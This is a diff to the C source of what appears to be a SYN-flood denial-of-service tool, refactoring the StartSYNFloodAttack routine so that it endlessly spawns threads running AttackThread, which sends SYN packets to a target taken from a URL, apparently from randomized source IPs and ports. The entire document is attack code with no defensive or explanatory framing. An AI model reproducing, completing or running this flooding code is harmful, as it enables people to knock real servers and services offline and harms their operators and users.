@@ -37,6 +37,7 @@ extern pSplitURLOutput SplitURL(const char *url, pSplitURLOutput *output);
 extern void FreeRandomIPBuff(char *p);
 extern char *GetRandomIP(char **output);
 extern size_t GetRandomPort(size_t *output);
+extern void SignalExit(int signo);
 
 //int attack(const struct AHTTP_INPUT *ainput)
 static int SendSYN(const pSYNStruct ss, const int debug_level)
@@ -251,7 +252,7 @@ static int AttackThread(pInput input)
     }
     syn_struct->dst_port = split_result->port;
     FreeSplitURLBuff(split_result);
-    syn_struct->each_ip_repeat= input->each_ip_repeat;
+    syn_struct->each_ip_repeat = input->each_ip_repeat;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
     for (;;)
@@ -298,111 +299,48 @@ int StartSYNFloodAttack(const pInput input)
     // run function in thread
     // this attack type must run as root
 
-    pid_t pid, wpid;
     pthread_t tid[input->max_thread];
     pthread_attr_t attr;
-    int i, j, ret;
-    int status = 0;
+    int j, ret;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodAttack");
-
-    extern void SignalExit(int signo);
     signal(SIGINT, SignalExit);
     // unlimit loop
     for (;;)
     {
         // only one process
-        if (input->max_process <= 1)
+        for (j = 0; j < input->max_thread; j++)
         {
-            for (j = 0; j < input->max_thread; j++)
+            //input->serial_num = (i * input->max_thread) + j;
+            if (pthread_attr_init(&attr))
             {
-                //input->serial_num = (i * input->max_thread) + j;
-                if (pthread_attr_init(&attr))
-                {
-                    DisplayError("StartSYNFloodAttack pthread_attr_init failed");
-                    return 1;
-                }
-                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
-                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-                {
-                    DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
-                    return 1;
-                }
-                // create thread
-                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
-                //printf("j is: %d\n", j);
-                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
-                // here we make a map
-                if (ret != 0)
-                {
-                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                    DisplayError("Create pthread failed");
-                    return 1;
-                }
-                pthread_attr_destroy(&attr);
+                DisplayError("StartSYNFloodAttack pthread_attr_init failed");
+                return 1;
             }
-            //pthread_detach(tid);
-            // join them all
-            for (j = 0; j < input->max_thread; j++)
+            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
             {
-                pthread_join(tid[j], NULL);
+                DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
+                return 1;
             }
+            // create thread
+            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
+            //printf("j is: %d\n", j);
+            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+            // here we make a map
+            if (ret != 0)
+            {
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                DisplayError("Create pthread failed");
+                return 1;
+            }
+            pthread_attr_destroy(&attr);
         }
-        else
+        //pthread_detach(tid);
+        // join them all
+        for (j = 0; j < input->max_thread; j++)
         {
-            // muti process
-            for (i = 0; i < input->max_process; i++)
-            {
-                pid = fork();
-                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
-                if (pid == 0)
-                {
-                    // child process
-                    for (j = 0; j < input->max_thread; j++)
-                    {
-                        //input->serial_num = (i * input->max_thread) + j;
-                        if (pthread_attr_init(&attr))
-                        {
-                            DisplayError("StartSYNFloodAttack pthread_attr_init failed");
-                            return 1;
-                        }
-                        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
-                        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-                        {
-                            DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
-                            return 1;
-                        }
-                        // create thread
-                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
-                        //printf("j is: %d\n", j);
-                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
-                        // here we make a map
-                        if (ret != 0)
-                        {
-                            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                            DisplayError("Create pthread failed");
-                            return 1;
-                        }
-                        pthread_attr_destroy(&attr);
-                    }
-                    //pthread_detach(tid);
-                    // join them all
-                    for (j = 0; j < input->max_thread; j++)
-                    {
-                        pthread_join(tid[j], NULL);
-                    }
-                }
-                else if (pid < 0)
-                {
-                    DisplayError("Create process failed");
-                }
-                // Father process
-                while ((wpid = wait(&status)) > 0)
-                {
-                    // nothing here
-                    // wait the child process end
-                }
-            }
+            pthread_join(tid[j], NULL);
         }
     }
     return 0;
